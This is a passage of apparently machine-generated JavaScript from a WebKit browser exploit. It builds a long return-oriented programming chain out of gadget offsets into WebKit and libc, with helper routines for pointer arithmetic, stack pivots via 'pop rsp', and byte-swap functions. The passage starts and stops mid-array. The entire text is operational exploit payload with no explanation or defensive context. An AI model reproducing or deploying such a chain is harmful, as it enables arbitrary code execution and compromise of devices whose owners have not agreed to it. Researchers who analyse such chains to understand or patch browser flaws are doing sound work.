webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1866:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L1867:
db([56, 0]); // 0x38
set_gadget(libc_base+155394,); //pop rdi
//L1868:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1869:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+137144, //L1871-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+137128, //L1870-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1870:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1871:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+137240, //L1874-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1872:
db([24, 0]); // 0x18
set_gadget(libc_base+757614,); //pop rcx
//L1874:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+137344, //L1877-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+137328, //L1876-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1876:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1877:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+137416, //L1878-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+137432, //L1879-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L1878:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1879:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+137576, //L1882-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+137544, //L1880-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+137560, //L1881-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1880:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1881:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1882:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+137664, //L1884-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L1883:
db([1, 0]); // 0x1
set_gadget(libc_base+467092,); //pop rax
//L1884:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+137768, //L1887-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1885:
db([24, 0]); // 0x18
set_gadget(libc_base+757614,); //pop rcx
//L1887:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+137872, //L1890-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+137856, //L1889-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1889:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1890:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+137960, //L1892-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+137976, //L1893-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
//L1892:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1893:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+138032, //L1895-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1895:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+7880191, //mov [rax], rcx
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+138152, //L1896-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1896:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+138208, //L1899-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1899:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+490911, //mov [rax], cl
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+138352, //L1902-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+138320, //L1900-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1900:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L1901:
db([56, 0]); // 0x38
set_gadget(libc_base+467092,); //pop rax
//L1902:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+138464, //L1903-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+138496, //L1905-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+138480, //L1904-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1903:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1904:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1905:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+138592, //L1906-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+138608, //L1907-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L1906:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1907:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+138720, //L1908-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+138704, //L1909-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L1909:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L1908:
db([0, 0]); // 0x0
set_gadgets([
libc_base+766440, //pop rsp
ropchain+140168, //L1910
//L1848:
libc_base+362222, //pop rsi
ropchain+138800, //L1913-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1911:
db([24, 0]); // 0x18
set_gadget(libc_base+757614,); //pop rcx
//L1913:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+138904, //L1916-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+138888, //L1915-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1915:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1916:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+139048, //L1919-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+139016, //L1917-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+139032, //L1918-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1917:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1918:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1919:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+139144, //L1922-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L1920:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1922:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+139248, //L1925-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+139232, //L1924-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1924:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1925:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+139416, //L1928-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+139432, //L1929-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+139384, //L1926-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+139400, //L1927-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1926:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L1927:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1928:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1929:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+139528, //L1931-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+139512, //L1930-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L1930:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1931:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L1933:
ropchain+139648, //L1932
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+140480, //L1934
//L1932:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([16, 0]); // 0x10
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+139768, //L1936-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+139784, //L1937-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+139752, //L1935-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1935:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1936:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1937:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+139888, //L1938-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+139920, //L1940-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+139904, //L1939-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1938:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1939:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1940:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+140016, //L1941-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+140032, //L1942-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L1941:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1942:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+140144, //L1943-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+140128, //L1944-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L1944:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L1943:
db([0, 0]); // 0x0
//L1910:
set_gadgets([
libc_base+362222, //pop rsi
ropchain+140232, //L1946-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+140216, //L1945-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L1945:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1946:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+140328, //L1947-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+140344, //L1948-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L1947:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1948:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+140456, //L1949-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+140440, //L1950-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L1950:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L1949:
db([0, 0]); // 0x0
//L1934:
set_gadget(libc_base+362222,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+141304, //L1951
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+141112, //L1952
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+141128, //L1953
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+141144, //L1954
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+141160, //L1955
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+141176, //L1956
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+226017, //mov rax, [rdi]
libc_base+757614, //pop rcx
ropchain+141192, //L1957
libc_base+308377, //mov [rcx], rax
webkit_base+12671175, //add rdi, rsi
libc_base+362222 //pop rsi
]);
db([4294967232, 4294967295]); // -0x40
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
ropchain+141224, //L1958
libc_base+424119, //mov [rdi], rax
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+766440, //pop rsp
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+467092, //pop rax
libc_base+11, //nop
libc_base+424119, //mov [rdi], rax
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+757614 //pop rcx
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+753071, //add rax, rcx
libc_base+757614 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+26378423, //and rax, rcx
libc_base+757614, //pop rcx
__swbuf_addr,
webkit_base+7880191, //mov [rax], rcx
libc_base+757614, //pop rcx
ropchain+141216, //L1959
libc_base+532458, //mov [rcx], rdi
libc_base+362222 //pop rsi
]);
db([40, 0]); // 0x28
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+757614, //pop rcx
ropchain+141272, //L1960
libc_base+532458, //mov [rcx], rdi
libc_base+729289, //mov rax, r8
libc_base+757614, //pop rcx
ropchain+141288, //L1961
libc_base+308377, //mov [rcx], rax
libc_base+155394 //pop rdi
]);
//L1952:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L1953:
db([0, 0]); // 0x0
set_gadget(libc_base+479586,); //pop rdx
//L1954:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L1955:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L1956:
db([0, 0]); // 0x0
set_gadget(webkit_base+4011105,); //pop r9
//L1957:
db([0, 0]); // 0x0
set_gadgets([
libc_base+128624, //xor eax, eax
libc_base+766440 //pop rsp
]);
//L1959:
db([0, 0]); // 0x0
//L1958:
set_gadgets([
libc_base+757614, //pop rcx
ropchain+141256, //L1962
libc_base+308377, //mov [rcx], rax
libc_base+757614 //pop rcx
]);
//L1962:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1960:
db([0, 0]); // 0x0
set_gadget(webkit_base+1412577,); //pop r8
//L1961:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L1951:
db([0, 0]); // 0x0
//___bswap64_var:
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+141360, //L1963-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L1963:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+141456, //L1965-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+141488, //L1968-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
webkit_base+1412577 //pop r8
]);
//L1965:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L1966:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1968:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+141592, //L1971-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+141576, //L1970-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1970:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1971:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+141696, //L1972-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+141728, //L1974-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+141712, //L1973-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L1972:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1973:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1974:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+141824, //L1975-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+141840, //L1976-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L1975:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1976:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+141952, //L1977-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+141936, //L1978-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L1978:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L1977:
db([0, 0]); // 0x0
set_gadgets([
libc_base+362222, //pop rsi
ropchain+142040, //L1980-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+142024, //L1979-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L1979:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1980:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+142136, //L1981-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+142152, //L1982-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+1412577 //pop r8
]);
//L1981:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1982:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+142264, //L1983-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+142248, //L1984-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L1984:
db([0, 0]); // 0x0
set_gadget(libc_base+766440,); //pop rsp
//L1983:
db([0, 0]); // 0x0
//___bswap32_var:
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+142336, //L1985-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
webkit_base+1412577 //pop r8
]);
//L1985:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+142432, //L1987-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+142464, //L1990-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
webkit_base+1412577 //pop r8
]);
//L1987:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L1988:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L1990:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+142568, //L1993-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+142552, //L1992-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L1992:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1993:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+142736, //L1996-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+142752, //L1997-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+142704, //L1994-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+142720, //L1995-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1994:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L1995:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L1996:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L1997:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+142912, //L2001-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+142864, //L1998-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+142896, //L2000-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L1998:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L1999:
db([32, 0]); // 0x20
set_gadget(libc_base+155394,); //pop rdi
//L2000:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2001:
db([0, 0]); // 0x0
set_gadgets([
libc_base+845783, //shl rax, cl
libc_base+845793, //shr rax, cl
libc_base+362222, //pop rsi
ropchain+143024, //L2002-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+143056, //L2004-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
